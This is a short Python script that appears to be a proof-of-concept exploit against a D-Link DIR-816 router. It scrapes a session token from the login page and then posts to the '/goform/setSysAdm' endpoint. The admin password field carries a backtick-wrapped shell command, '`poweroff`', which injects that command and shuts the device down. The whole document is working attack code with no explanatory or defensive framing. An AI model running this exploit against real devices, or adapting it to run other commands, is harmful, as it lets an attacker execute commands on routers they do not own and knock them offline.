# coding=utf-8
import requests
import re

ip = "192.168.0.1"
cmd = "`poweroff`"

print("[+]Get tokenid")

url = "http://{}/dir_login.asp".format(ip)
rsp = requests.get(url)

pattern = re.compile(r'name="tokenid"  value="\d+"')
result = pattern.findall(rsp.text)
tokenid = result[0][23:33]
print("[+]tokenid:{}".format(tokenid))

url = "http://{}/goform/setSysAdm".format(ip)
data = {"admuser": "admin", "admpass": cmd, "tokenid": tokenid}
try:
    requests.post(url, data=data, allow_redirects=False, timeout=1)
except:
    pass
print("[+]DIR816: {}".format(cmd))
